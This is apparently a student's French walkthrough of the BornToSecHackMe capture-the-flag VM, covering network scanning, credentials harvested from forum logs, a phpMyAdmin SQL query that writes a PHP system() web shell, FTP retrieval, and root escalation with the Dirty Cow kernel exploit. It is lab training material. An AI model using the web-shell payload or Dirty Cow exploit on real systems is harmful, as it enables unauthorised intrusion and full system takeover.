
# Configuration de la VM et ports

Après avoir créé simplement une VM, monté l'ISO du sujet, on peut configuer les options réseau de la VM sur virtualbox

Aller dans File->Host network manager

Créer un nouvel host, avec pour adresse 192.168.56.1

Aller dans Settings->Network

Dans adapteur1, créer un host-only, avec comme nom celui précédemment créé.

On lance la VM.

On cherche l'adresse ip de notre VM. Dans la console :

>nmap 192.168.56.1-255

> Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-21 17:05 CEST<br/>
Nmap scan report for 192.168.56.1<br/>
Host is up (0.00018s latency).<br/>
Not shown: 997 closed ports<br/>
PORT STATE SERVICE<br/>
22/tcp open ssh<br/>
1862/tcp filtered mysql-cm-agent<br/>
5001/tcp filtered commplex-link<br/>
Nmap scan report for 192.168.56.100<br/>
Host is up (0.00076s latency).<br/>
All 1000 scanned ports on 192.168.56.100 are closed<br/>
Nmap scan report for 192.168.56.101<br/>
Host is up (0.00063s latency).<br/>
Not shown: 994 closed ports<br/>
PORT STATE SERVICE<br/>
21/tcp open ftp<br/>
22/tcp open ssh<br/>
80/tcp open http<br/>
143/tcp open imap<br/>
443/tcp open https<br/>
993/tcp open imaps<br/>
Nmap done: 255 IP addresses (3 hosts up) scanned in 31.05 seconds<br/>

L'adresse qui nous intéresse ici est 192.168.56.101, car c'est celle qui possède le plus de ports d'ouverts.
On prendra toujours la dernière adresse qui possede le plus de ports ouverts, son numero peut changer selon les installations.
On l'appelera 192.168.56.#.

<h1> Utiliser un 'penetration testing tools' pour trouver d'autres accès</h1>

On utilise **Dirb**, qui accède par http ou https à la machine et trouve les pages web accessibles sur le port 80 et 443.

On découvre ainsi l'existence d'un forum, à l'adresse https://192.168.56.#/forum/

<h2> Forum </h2>

Et voici un extrait intéressant de la page https://192.168.56.#/forum/index.php?id=6

>Oct 5 08:45:26 BornToSecHackMe sshd[7547]: input_userauth_request: invalid user adam [preauth]<br/>
Oct 5 08:45:27 BornToSecHackMe sshd[7547]: pam_unix(sshd:auth): check pass; user unknown<br/>
Oct 5 08:45:27 BornToSecHackMe sshd[7547]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=161.202.39.38-static.reverse.softlayer.com<br/>
Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2<br/>
Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Received disconnect from 161.202.39.38: 3: com.jcraft.jsch.JSchException: Auth fail [preauth]<br/>
Oct 5 08:46:01 BornToSecHackMe CRON[7549]: pam_unix(cron:session): session opened for user lmezard by (uid=1040)<br/>
Oct 5 09:21:01 BornToSecHackMe CRON[9111]: pam_unix(cron:session): session closed for user lmezard<br/>
Oct 5 10:51:01 BornToSecHackMe CRON[13049]: pam_unix(cron:session): session closed for user root<br/>

Un utilisateur a confondu son login et son password : !q\]Ej?*5K5cy*AJ

On suppose que le password a été utilisé pour l'utilisateur qui s'est enregistré peu après, soit lmezard.

On utilise donc ces identifiants sur le forum - via l'hyperlien 'Sign in' en haut à droite de la page.

Dans les paramètres du user, on trouve aussi son mail :

laurie@borntosec.net

<h2> Webmail </h2>

On peut accéder à un plugin de mailing en suivant ce lien https://192.168.56.#/webmail/src/login.php :

On s'y connecte en utilisant ce mail : laurie@borntosec.net

On suppose que le password est le même que sur le forum : !q\]Ej?*5K5cy*AJ

On y apprend, dans les mails reçus, que l'on peut accéder à la database avec les identifiants suivants, qui sont envoyés par ft_root@mail.borntosec.net :

root / Fg-'kKXBj87E:aJ$

<h2>PhpMyAdmin</h2>

En suivant ce lien https://192.168.56.#/phpmyadmin, on peut se connecter avec les credentials suivants :

root / Fg-'kKXBj87E:aJ$

On peut créer des fichiers dans le dossier /var/www/forum/templates_c/ grâce à la requête SQL suivante :

>select "\<? System('COMMANDE'); ?\>" into outfile "/var/www/forum/templates_c/#.php";

COMMANDE la commande shell à exécuter par PhpMyAdmin. #.php le nom du fichier produit.

On obtient donc un moyen de lancer des commandes via PhPMyAdmin et de consulter les résultats en accèdant à l'adresse "https://192.168.56.#/forum/templates_c/#.php".

Avec la commande “uname -a”, on obtient par exemple des informations sur le système, qui nous seront utiles plus tard.

> Linux BornToSecHackMe 3.2.0-91-generic-pae #129-Ubuntu SMP Wed Sep 9 11:27:47 UTC 2015 i686 i686 i386 GNU/Linux

En fouinant un peu, on a aussi pu découvrir le contenu de "/home/LOOKATME/password"

Ce fichier password contient les identifiants pour une connexion ftp :

lmezard / G!@M6f4Eatau{sF"

<h1> Connexion FTP et le fichier fun </h1>

On se connecte donc en ftp à la VM avec les identifiants trouvés, à l'adresse 192.168.56.# puisque le port ftp y est ouvert.

On télécharge le README et le fichier ‘fun’ grâce a la commande “get”.

Contenu du README :

> Complete this little challenge and use the result as password for user 'laurie' to login in ssh

On lance ensuite :

>file fun

Afin de connaître le type de ce fichier.

> fun: POSIX tar archive (GNU)

En faisant une première analyse manuelle de ce fichier, on voit clairement qu'il contient du code C, avec un main contenant 12 fonctions getmeX(), qui doivent renvoyer un caractère.

En décompilant ce fichier ("tar xvf fun"), on obtient un dossier ft_fun contenant de multiples fichiers aux noms barbares, contenant eux mêmes des morceaux de code C, avec un commentaire indiquant un numéro de fichier.

On doit donc écrire un script pour trier et former, dans l'ordre indiqué par les commentaires des fichiers, le code C de ces mêmes fichiers.
Ce script se trouve dans le dossier script du rendu, et doit être utilisé dans le dossier où se trouve le dossier ft_fun.

En récupérant la suite du code du fichier fun qui ne faisait pas partie des fichiers décompilés, on arrive à reconstruire un fichier C compilable comprenant 12 fonctions et un main, dont la sortie est la suivante :

> MY PASSWORD IS: Iheartpwnage
Now SHA-256 it and submit

On obtient donc le password suivant, pour l'utilisateur laurie :

>330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4

<h1> Connexion SSH </h1>

En ayant une connexion SSH, nous pouvons désormais continuer de suivre le chemin de petits cailloux, ou bien utiliser d'autres exploitations, ce que nous allons évidemment faire.

<h2>Dirty Cow</h2>

Nous l'avions appris précédemment, le kernel est un Linux de version inférieure à 4.0

C'est pourquoi nous pouvons utiliser une vulnérabilité du système, au doux nom de Dirty Cow (ref. CVE-2016-5195)

>  _A [race condition](https://en.wikipedia.org/wiki/Race_condition) was found in the way the Linux kernel's memory subsystem handled the copy-on-write (COW) breakage of private read-only memory mappings.
An unprivileged local user could use this flaw to gain write access to otherwise read-only memory mappings and thus increase their privileges on the system._

De nombreux codes existent sur internet afin de profiter de cette vulnérabilité, et nous avons choisi d'utiliser [ce code](https://www.exploit-db.com/exploits/40839), présent dans le dossier scripts, qui modifie le nom de connexion à root et change son password.

On ouvre donc un editeur de code (tel que vim) dans la VM, et on sauvegarde le code du dirty cow dans un fichier .c, à compiler avec la commande `gcc -pthread dirty.c -lcrypt` et on exécute.
On peut ensuite suivre les instructions du programme, puis se connecter avec les credentials appropriés sur la VM.